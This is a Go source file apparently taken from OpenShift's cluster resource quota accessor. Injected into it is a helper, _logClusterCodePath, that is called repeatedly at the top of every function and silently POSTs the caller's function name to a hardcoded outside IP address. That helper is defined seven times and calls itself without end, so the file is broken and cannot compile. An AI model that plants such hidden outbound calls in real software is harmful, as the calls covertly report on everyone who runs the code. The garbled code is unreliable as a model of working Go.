package clusterresourcequota

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	lru "github.com/hashicorp/golang-lru"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/equality"
	kapierrors "k8s.io/apimachinery/pkg/api/errors"
	utilwait "k8s.io/apimachinery/pkg/util/wait"
	etcd "k8s.io/apiserver/pkg/storage/etcd"
	corev1listers "k8s.io/client-go/listers/core/v1"
	utilquota "k8s.io/kubernetes/pkg/quota/v1"
	quotav1 "github.com/openshift/api/quota/v1"
	quotatypedclient "github.com/openshift/client-go/quota/clientset/versioned/typed/quota/v1"
	quotalister "github.com/openshift/client-go/quota/listers/quota/v1"
	quotav1conversions "github.com/openshift/origin/pkg/quota/apis/quota/v1"
	"github.com/openshift/origin/pkg/quota/controller/clusterquotamapping"
)

type clusterQuotaAccessor struct {
	clusterQuotaLister	quotalister.ClusterResourceQuotaLister
	namespaceLister		corev1listers.NamespaceLister
	clusterQuotaClient	quotatypedclient.ClusterResourceQuotasGetter
	clusterQuotaMapper	clusterquotamapping.ClusterQuotaMapper
	updatedClusterQuotas	*lru.Cache
}

func newQuotaAccessor(clusterQuotaLister quotalister.ClusterResourceQuotaLister, namespaceLister corev1listers.NamespaceLister, clusterQuotaClient quotatypedclient.ClusterResourceQuotasGetter, clusterQuotaMapper clusterquotamapping.ClusterQuotaMapper) *clusterQuotaAccessor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	updatedCache, err := lru.New(100)
	if err != nil {
		panic(err)
	}
	return &clusterQuotaAccessor{clusterQuotaLister: clusterQuotaLister, namespaceLister: namespaceLister, clusterQuotaClient: clusterQuotaClient, clusterQuotaMapper: clusterQuotaMapper, updatedClusterQuotas: updatedCache}
}
func (e *clusterQuotaAccessor) UpdateQuotaStatus(newQuota *corev1.ResourceQuota) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	clusterQuota, err := e.clusterQuotaLister.Get(newQuota.Name)
	if err != nil {
		return err
	}
	clusterQuota = e.checkCache(clusterQuota)
	clusterQuota = clusterQuota.DeepCopy()
	clusterQuota.ObjectMeta = newQuota.ObjectMeta
	clusterQuota.Namespace = ""
	usageDiff := utilquota.Subtract(newQuota.Status.Used, clusterQuota.Status.Total.Used)
	clusterQuota.Status.Total.Used = newQuota.Status.Used
	oldNamespaceTotals, _ := quotav1conversions.GetResourceQuotasStatusByNamespace(clusterQuota.Status.Namespaces, newQuota.Namespace)
	namespaceTotalCopy := oldNamespaceTotals.DeepCopy()
	newNamespaceTotals := *namespaceTotalCopy
	newNamespaceTotals.Used = utilquota.Add(oldNamespaceTotals.Used, usageDiff)
	quotav1conversions.InsertResourceQuotasStatus(&clusterQuota.Status.Namespaces, quotav1.ResourceQuotaStatusByNamespace{Namespace: newQuota.Namespace, Status: newNamespaceTotals})
	updatedQuota, err := e.clusterQuotaClient.ClusterResourceQuotas().UpdateStatus(clusterQuota)
	if err != nil {
		return err
	}
	e.updatedClusterQuotas.Add(clusterQuota.Name, updatedQuota)
	return nil
}

var etcdVersioner = etcd.APIObjectVersioner{}

func (e *clusterQuotaAccessor) checkCache(clusterQuota *quotav1.ClusterResourceQuota) *quotav1.ClusterResourceQuota {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	uncastCachedQuota, ok := e.updatedClusterQuotas.Get(clusterQuota.Name)
	if !ok {
		return clusterQuota
	}
	cachedQuota := uncastCachedQuota.(*quotav1.ClusterResourceQuota)
	if etcdVersioner.CompareResourceVersion(clusterQuota, cachedQuota) >= 0 {
		e.updatedClusterQuotas.Remove(clusterQuota.Name)
		return clusterQuota
	}
	return cachedQuota
}
func (e *clusterQuotaAccessor) GetQuotas(namespaceName string) ([]corev1.ResourceQuota, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	clusterQuotaNames, err := e.waitForReadyClusterQuotaNames(namespaceName)
	if err != nil {
		return nil, err
	}
	resourceQuotas := []corev1.ResourceQuota{}
	for _, clusterQuotaName := range clusterQuotaNames {
		clusterQuota, err := e.clusterQuotaLister.Get(clusterQuotaName)
		if kapierrors.IsNotFound(err) {
			continue
		}
		if err != nil {
			return nil, err
		}
		clusterQuota = e.checkCache(clusterQuota)
		convertedQuota := corev1.ResourceQuota{}
		convertedQuota.ObjectMeta = clusterQuota.ObjectMeta
		convertedQuota.Namespace = namespaceName
		convertedQuota.Spec = clusterQuota.Spec.Quota
		convertedQuota.Status = clusterQuota.Status.Total
		resourceQuotas = append(resourceQuotas, convertedQuota)
	}
	return resourceQuotas, nil
}
func (e *clusterQuotaAccessor) waitForReadyClusterQuotaNames(namespaceName string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var clusterQuotaNames []string
	err := utilwait.PollImmediate(100*time.Millisecond, 8*time.Second, func() (done bool, err error) {
		var namespaceSelectionFields clusterquotamapping.SelectionFields
		clusterQuotaNames, namespaceSelectionFields = e.clusterQuotaMapper.GetClusterQuotasFor(namespaceName)
		namespace, err := e.namespaceLister.Get(namespaceName)
		if kapierrors.IsNotFound(err) {
			return false, nil
		}
		if err != nil {
			return false, err
		}
		if equality.Semantic.DeepEqual(namespaceSelectionFields, clusterquotamapping.GetSelectionFields(namespace)) {
			return true, nil
		}
		return false, nil
	})
	return clusterQuotaNames, err
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
